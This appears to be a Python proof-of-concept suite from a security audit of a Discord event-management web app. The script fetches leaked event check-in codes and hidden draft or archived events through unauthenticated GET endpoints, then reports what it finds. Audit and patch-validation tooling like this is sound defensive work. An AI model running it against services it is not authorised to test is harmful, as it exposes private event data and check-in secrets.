#!/usr/bin/env python3
"""
DEMS — Proof-of-Concept Exploit Suite
=====================================

Automated demonstration of two unauthenticated information-disclosure
vulnerabilities in the Discord Event Management System:

    C-01   Check-in code leak via GET /api/events/:id
    C-02   Draft / archived / cancelled event disclosure via
           GET /api/events?status=<state>

Also probes:
    M-05   Public comments endpoint
    INFO   /api/server-info, /api/maintenance/status, /api/updates

The tool performs only idempotent HTTP GET requests against the target
and never mutates server state. It is intended for defensive use:
reproducing findings from `docs/security/SECURITY_AUDIT_2026-04-22.md`
so that patches can be validated.

Usage
-----
    pip install requests
    python3 dems_poc.py --target https://dems.example.org
    python3 dems_poc.py --target http://localhost:3000 --json report.json
    python3 dems_poc.py --target http://localhost:3000 --only checkin
    python3 dems_poc.py --help

Exit codes
----------
    0  no vulnerabilities detected
    1  at least one vulnerability confirmed
    2  usage / runtime error

Author : Security audit 2026-04-22
License: Internal / defensive use only
"""

from __future__ import annotations

import argparse
import json
import logging
import signal
import sys
import time
from dataclasses import dataclass, field, asdict
from datetime import datetime, timezone
from typing import Any, Callable, Dict, Iterable, List, Optional
from urllib.parse import urljoin

try:
    import requests
    from requests.adapters import HTTPAdapter
    from urllib3.util.retry import Retry
except ImportError:  # pragma: no cover
    sys.stderr.write(
        "error: 'requests' is required. Install with: pip install requests\n"
    )
    sys.exit(2)


# --------------------------------------------------------------------------- #
# Configuration                                                                #
# --------------------------------------------------------------------------- #

USER_AGENT = "DEMS-SecurityPoC/1.0 (+defensive-audit)"
DEFAULT_TIMEOUT = 10
DEFAULT_MAX_EVENTS = 25
STATUS_FILTERS = ("draft", "archived", "cancelled")
ALL_CHECKS = ("fingerprint", "drafts", "checkin", "comments")


# --------------------------------------------------------------------------- #
# Data model                                                                   #
# --------------------------------------------------------------------------- #


@dataclass
class Finding:
    """A single exploit result."""

    check_id: str
    title: str
    severity: str  # "critical" | "high" | "medium" | "low" | "info"
    confirmed: bool
    evidence: Dict[str, Any] = field(default_factory=dict)
    remediation: str = ""


@dataclass
class Report:
    """Final structured output."""

    target: str
    started_at: str
    finished_at: str
    findings: List[Finding] = field(default_factory=list)

    @property
    def confirmed_count(self) -> int:
        return sum(1 for f in self.findings if f.confirmed)

    @property
    def vulnerable_count(self) -> int:
        """Confirmed findings that are not purely informational."""
        return sum(1 for f in self.findings
                   if f.confirmed and f.severity != "info")

    def to_dict(self) -> Dict[str, Any]:
        return {
            "target": self.target,
            "started_at": self.started_at,
            "finished_at": self.finished_at,
            "confirmed_count": self.confirmed_count,
            "findings": [asdict(f) for f in self.findings],
        }


# --------------------------------------------------------------------------- #
# HTTP client                                                                  #
# --------------------------------------------------------------------------- #


class DemsClient:
    """Thin wrapper around :mod:`requests` with retries + sane defaults."""

    def __init__(self, base_url: str, timeout: int = DEFAULT_TIMEOUT,
                 verify_tls: bool = True) -> None:
        self.base_url = base_url.rstrip("/")
        self.timeout = timeout
        self.session = requests.Session()
        self.session.headers.update({"User-Agent": USER_AGENT,
                                     "Accept": "application/json"})
        self.session.verify = verify_tls

        retry = Retry(
            total=1,
            backoff_factor=0.3,
            status_forcelist=(502, 503, 504),
            allowed_methods=frozenset({"GET"}),
        )
        adapter = HTTPAdapter(max_retries=retry, pool_connections=10,
                              pool_maxsize=10)
        self.session.mount("http://", adapter)
        self.session.mount("https://", adapter)

    def get(self, path: str, **kwargs: Any) -> requests.Response:
        url = urljoin(self.base_url + "/", path.lstrip("/"))
        logging.debug("GET %s params=%s", url, kwargs.get("params"))
        return self.session.get(url, timeout=self.timeout, **kwargs)

    def get_json(self, path: str, **kwargs: Any) -> Any:
        resp = self.get(path, **kwargs)
        resp.raise_for_status()
        try:
            return resp.json()
        except ValueError as exc:
            raise RuntimeError(
                f"Non-JSON response from {path}: {resp.text[:200]!r}"
            ) from exc


# --------------------------------------------------------------------------- #
# Individual exploits                                                          #
# --------------------------------------------------------------------------- #


class Check:
    """Base class for an individual PoC check."""

    id: str = ""
    title: str = ""
    severity: str = "info"
    remediation: str = ""

    def __init__(self, client: DemsClient) -> None:
        self.client = client
        self.log = logging.getLogger(self.__class__.__name__)

    def run(self) -> Finding:  # pragma: no cover - overridden
        raise NotImplementedError


class FingerprintCheck(Check):
    """Passive fingerprinting — non-exploitative, collects context."""

    id = "INFO-FINGERPRINT"
    title = "Server fingerprint"
    severity = "info"
    remediation = "n/a — informational only."

    def run(self) -> Finding:
        evidence: Dict[str, Any] = {}
        for endpoint in ("/api/server-info", "/api/maintenance/status",
                         "/api/updates", "/api/csrf-token"):
            try:
                resp = self.client.get(endpoint)
                evidence[endpoint] = {
                    "status": resp.status_code,
                    "body": _truncate_json(resp),
                }
            except requests.RequestException as exc:
                evidence[endpoint] = {"error": str(exc)}
                self.log.warning("Fingerprint probe failed: %s (%s)",
                                 endpoint, exc)

        server_info = evidence.get("/api/server-info", {}).get("body") or {}
        debug_mode = bool(isinstance(server_info, dict)
                          and server_info.get("debugMode"))
        return Finding(
            check_id=self.id,
            title=self.title,
            severity=self.severity,
            confirmed=True,  # informational always "confirmed"
            evidence={**evidence, "debug_mode_enabled": debug_mode},
            remediation=self.remediation,
        )


class DraftDisclosureCheck(Check):
    """C-02 — GET /api/events?status=draft returns drafts unauthenticated."""

    id = "C-02"
    title = "Unauthenticated disclosure of non-active events"
    severity = "critical"
    remediation = (
        "In routes/events.js restrict the ?status=... query to admin "
        "sessions; default to 'active' for everyone else."
    )

    def run(self) -> Finding:
        leaked: Dict[str, List[Dict[str, Any]]] = {}
        total_leaked = 0
        for status in STATUS_FILTERS:
            try:
                data = self.client.get_json("/api/events",
                                            params={"status": status,
                                                    "limit": 100})
            except Exception as exc:
                self.log.warning("?status=%s failed: %s", status, exc)
                continue

            events = _extract_events(data)
            if events:
                leaked[status] = [
                    {
                        "id": e.get("id"),
                        "title": e.get("title"),
                        "startDate": e.get("startDate"),
                        "createdAt": e.get("createdAt"),
                    }
                    for e in events
                ]
                total_leaked += len(events)

        confirmed = total_leaked > 0
        return Finding(
            check_id=self.id,
            title=self.title,
            severity=self.severity,
            confirmed=confirmed,
            evidence={
                "leaked_count": total_leaked,
                "per_status": leaked,
            },
            remediation=self.remediation,
        )


class CheckinCodeLeakCheck(Check):
    """C-01 — GET /api/events/:id leaks checkinCode."""

    id = "C-01"
    title = "Check-in code leaked in public event detail"
    severity = "critical"
    remediation = (
        "In routes/events.js (GET /api/events/:id) remove 'checkinCode' "
        "from the spread response body; return an explicit whitelist."
    )

    def __init__(self, client: DemsClient, max_events: int) -> None:
        super().__init__(client)
        self.max_events = max_events

    def run(self) -> Finding:
        event_ids = self._collect_event_ids()
        leaks: List[Dict[str, Any]] = []
        inspected = 0

        for eid in event_ids[: self.max_events]:
            inspected += 1
            try:
                detail = self.client.get_json(f"/api/events/{eid}")
            except Exception as exc:
                self.log.warning("detail fetch failed for %s: %s", eid, exc)
                continue

            code = detail.get("checkinCode")
            if code:
                leaks.append({
                    "event_id": eid,
                    "title": detail.get("title"),
                    "checkin_enabled": detail.get("checkinEnabled"),
                    "checkin_code": code,
                    "checkin_message": detail.get("checkinMessage"),
                })
                self.log.info("LEAK: event %s -> code=%s", eid, code)

        return Finding(
            check_id=self.id,
            title=self.title,
            severity=self.severity,
            confirmed=bool(leaks),
            evidence={
                "inspected_events": inspected,
                "leaked_codes": leaks,
            },
            remediation=self.remediation,
        )

    def _collect_event_ids(self) -> List[str]:
        """Collect ids from every status the server happens to expose."""
        ids: List[str] = []
        seen: set = set()

        def absorb(payload: Any) -> None:
            for ev in _extract_events(payload):
                eid = ev.get("id")
                if eid and eid not in seen:
                    seen.add(eid)
                    ids.append(eid)

        # Public baseline
        try:
            absorb(self.client.get_json("/api/events", params={"limit": 100}))
        except Exception as exc:
            self.log.warning("baseline event list failed: %s", exc)

        # Anything we can reach via status filter (piggy-backs on C-02)
        for status in STATUS_FILTERS:
            try:
                absorb(self.client.get_json("/api/events",
                                            params={"status": status,
                                                    "limit": 100}))
            except Exception:
                continue

        return ids


class PublicCommentsCheck(Check):
    """M-05 — GET /api/events/:id/comments has no auth."""

    id = "M-05"
    title = "Public comments endpoint"
    severity = "medium"
    remediation = (
        "Attach requireAuth to GET /api/events/:id/comments, or document "
        "that comments are intentionally public."
    )

    def run(self) -> Finding:
        try:
            events = _extract_events(
                self.client.get_json("/api/events", params={"limit": 1})
            )
        except Exception as exc:
            self.log.warning("cannot list events for comments probe: %s",
                             exc)
            return Finding(self.id, self.title, self.severity, False,
                           {"error": str(exc)}, self.remediation)

        if not events:
            return Finding(self.id, self.title, self.severity, False,
                           {"reason": "no events available"},
                           self.remediation)

        eid = events[0]["id"]
        try:
            resp = self.client.get(f"/api/events/{eid}/comments")
        except requests.RequestException as exc:
            return Finding(self.id, self.title, self.severity, False,
                           {"error": str(exc)}, self.remediation)

        confirmed = resp.status_code == 200
        try:
            body = resp.json()
            sample = body[:3] if isinstance(body, list) else body
        except ValueError:
            sample = resp.text[:200]

        return Finding(
            check_id=self.id,
            title=self.title,
            severity=self.severity,
            confirmed=confirmed,
            evidence={
                "event_id": eid,
                "status": resp.status_code,
                "sample": sample,
            },
            remediation=self.remediation,
        )


# --------------------------------------------------------------------------- #
# Helpers                                                                      #
# --------------------------------------------------------------------------- #


def _extract_events(payload: Any) -> List[Dict[str, Any]]:
    """Normalize the variants the API returns (bare list vs. {data, meta})."""
    if isinstance(payload, list):
        return [e for e in payload if isinstance(e, dict)]
    if isinstance(payload, dict):
        data = payload.get("data")
        if isinstance(data, list):
            return [e for e in data if isinstance(e, dict)]
    return []


def _truncate_json(resp: requests.Response, limit: int = 400) -> Any:
    try:
        body = resp.json()
    except ValueError:
        return resp.text[:limit]
    text = json.dumps(body)
    if len(text) > limit:
        return json.loads(text[:limit] + "..." if False else text)  # full
    return body


# --------------------------------------------------------------------------- #
# Reporting                                                                    #
# --------------------------------------------------------------------------- #


_SEVERITY_WEIGHT = {"critical": 0, "high": 1, "medium": 2, "low": 3, "info": 4}
_SEVERITY_COLOR = {
    "critical": "\033[1;31m",
    "high": "\033[1;33m",
    "medium": "\033[0;33m",
    "low": "\033[0;36m",
    "info": "\033[0;37m",
}
_RESET = "\033[0m"


def print_report(report: Report, use_color: bool) -> None:
    ordered = sorted(
        report.findings,
        key=lambda f: (_SEVERITY_WEIGHT.get(f.severity, 9),
                       not f.confirmed,
                       f.check_id),
    )
    bar = "=" * 72
    print(bar)
    print(f"DEMS PoC report — target: {report.target}")
    print(f"started  : {report.started_at}")
    print(f"finished : {report.finished_at}")
    print(f"confirmed: {report.confirmed_count}/{len(report.findings)} "
          f"(vulnerable: {report.vulnerable_count})")
    print(bar)
    for f in ordered:
        marker = "✔" if f.confirmed else "·"
        tag = f"[{f.severity.upper():>8}] {marker} {f.check_id}"
        if use_color:
            tag = f"{_SEVERITY_COLOR.get(f.severity, '')}{tag}{_RESET}"
        print(f"\n{tag} — {f.title}")
        if not f.confirmed:
            print("    (not confirmed)")
            continue
        _render_evidence(f)
        if f.remediation:
            print(f"    fix: {f.remediation}")
    print()


def _render_evidence(finding: Finding) -> None:
    ev = finding.evidence
    if finding.check_id == "C-02":
        print(f"    leaked_count: {ev.get('leaked_count')}")
        for status, items in (ev.get("per_status") or {}).items():
            print(f"    status={status} ({len(items)} items)")
            for item in items[:5]:
                print(f"      - {item['id']}  {item['title']!r}")
            if len(items) > 5:
                print(f"      ... (+{len(items) - 5} more)")
    elif finding.check_id == "C-01":
        print(f"    inspected_events: {ev.get('inspected_events')}")
        for leak in ev.get("leaked_codes", [])[:10]:
            print(f"      ! event {leak['event_id']}  "
                  f"title={leak['title']!r}  "
                  f"code={leak['checkin_code']}  "
                  f"enabled={leak['checkin_enabled']}")
        extra = max(0, len(ev.get("leaked_codes", [])) - 10)
        if extra:
            print(f"      ... (+{extra} more)")
    elif finding.check_id == "M-05":
        print(f"    event_id: {ev.get('event_id')} "
              f"status={ev.get('status')}")
    elif finding.check_id == "INFO-FINGERPRINT":
        print(f"    debug_mode_enabled: {ev.get('debug_mode_enabled')}")
        si = ev.get("/api/server-info", {}).get("body")
        if isinstance(si, dict):
            print(f"    server_name : {si.get('serverName')!r}")
            print(f"    guild_id    : {si.get('guildId')!r}")


# --------------------------------------------------------------------------- #
# Runner                                                                       #
# --------------------------------------------------------------------------- #


def build_checks(client: DemsClient, selection: Iterable[str],
                 max_events: int) -> List[Check]:
    registry: Dict[str, Callable[[], Check]] = {
        "fingerprint": lambda: FingerprintCheck(client),
        "drafts":      lambda: DraftDisclosureCheck(client),
        "checkin":     lambda: CheckinCodeLeakCheck(client, max_events),
        "comments":    lambda: PublicCommentsCheck(client),
    }
    checks: List[Check] = []
    for name in selection:
        if name not in registry:
            raise ValueError(f"unknown check {name!r}. "
                             f"Available: {', '.join(registry)}")
        checks.append(registry[name]())
    return checks


def run(target: str, selection: List[str], *, timeout: int,
        max_events: int, verify_tls: bool) -> Report:
    client = DemsClient(target, timeout=timeout, verify_tls=verify_tls)
    checks = build_checks(client, selection, max_events)

    started = datetime.now(timezone.utc).isoformat()
    findings: List[Finding] = []
    for check in checks:
        t0 = time.monotonic()
        try:
            finding = check.run()
        except Exception as exc:  # never abort the whole sweep
            logging.exception("check %s crashed", check.id)
            finding = Finding(
                check_id=check.id or check.__class__.__name__,
                title=check.title,
                severity=check.severity,
                confirmed=False,
                evidence={"error": str(exc)},
                remediation=check.remediation,
            )
        logging.info("%s finished in %.2fs (confirmed=%s)",
                     check.id, time.monotonic() - t0, finding.confirmed)
        findings.append(finding)

    finished = datetime.now(timezone.utc).isoformat()
    return Report(target=target, started_at=started, finished_at=finished,
                  findings=findings)


# --------------------------------------------------------------------------- #
# CLI                                                                          #
# --------------------------------------------------------------------------- #


def parse_args(argv: Optional[List[str]] = None) -> argparse.Namespace:
    p = argparse.ArgumentParser(
        prog="dems_poc",
        description=("DEMS automated security PoC — read-only exploit "
                     "demonstrator for findings C-01 and C-02."),
    )
    p.add_argument("--target", required=True,
                   help="Base URL of the DEMS instance "
                        "(e.g. http://localhost:3000).")
    p.add_argument("--only", default=",".join(ALL_CHECKS),
                   help=f"Comma-separated checks to run. "
                        f"Default: {','.join(ALL_CHECKS)}")
    p.add_argument("--timeout", type=int, default=DEFAULT_TIMEOUT,
                   help="Per-request timeout in seconds "
                        "(default: %(default)s).")
    p.add_argument("--max-events", type=int, default=DEFAULT_MAX_EVENTS,
                   help="Upper bound of events to probe for C-01 "
                        "(default: %(default)s).")
    p.add_argument("--json", metavar="PATH",
                   help="Write machine-readable JSON report to PATH.")
    p.add_argument("--no-verify-tls", action="store_true",
                   help="Disable TLS verification "
                        "(lab use only, never in production).")
    p.add_argument("--no-color", action="store_true",
                   help="Disable ANSI colour in the terminal report.")
    p.add_argument("-v", "--verbose", action="count", default=0,
                   help="-v for INFO, -vv for DEBUG.")
    return p.parse_args(argv)


def configure_logging(verbosity: int) -> None:
    level = logging.WARNING
    if verbosity == 1:
        level = logging.INFO
    elif verbosity >= 2:
        level = logging.DEBUG
    logging.basicConfig(
        level=level,
        format="%(asctime)s %(levelname)-7s %(name)s: %(message)s",
        datefmt="%H:%M:%S",
    )
    # urllib3 emits per-retry warnings that drown the report; only show
    # them when the operator explicitly asks for -vv.
    if verbosity < 2:
        logging.getLogger("urllib3").setLevel(logging.ERROR)


def _install_signal_handlers() -> None:
    def _handler(signum: int, _frame: Any) -> None:
        logging.warning("received signal %s — aborting", signum)
        sys.exit(130)

    for sig in (signal.SIGINT, signal.SIGTERM):
        signal.signal(sig, _handler)


def main(argv: Optional[List[str]] = None) -> int:
    args = parse_args(argv)
    configure_logging(args.verbose)
    _install_signal_handlers()

    if args.no_verify_tls:
        requests.packages.urllib3.disable_warnings(  # type: ignore[attr-defined]
            requests.packages.urllib3.exceptions.InsecureRequestWarning  # type: ignore[attr-defined]
        )

    selection = [s.strip() for s in args.only.split(",") if s.strip()]
    try:
        report = run(
            target=args.target,
            selection=selection,
            timeout=args.timeout,
            max_events=args.max_events,
            verify_tls=not args.no_verify_tls,
        )
    except ValueError as exc:
        sys.stderr.write(f"error: {exc}\n")
        return 2
    except requests.RequestException as exc:
        sys.stderr.write(f"network error: {exc}\n")
        return 2

    use_color = (not args.no_color) and sys.stdout.isatty()
    print_report(report, use_color=use_color)

    if args.json:
        with open(args.json, "w", encoding="utf-8") as fh:
            json.dump(report.to_dict(), fh, indent=2, ensure_ascii=False)
        logging.info("wrote JSON report to %s", args.json)

    return 1 if report.vulnerable_count > 0 else 0


if __name__ == "__main__":  # pragma: no cover
    sys.exit(main())
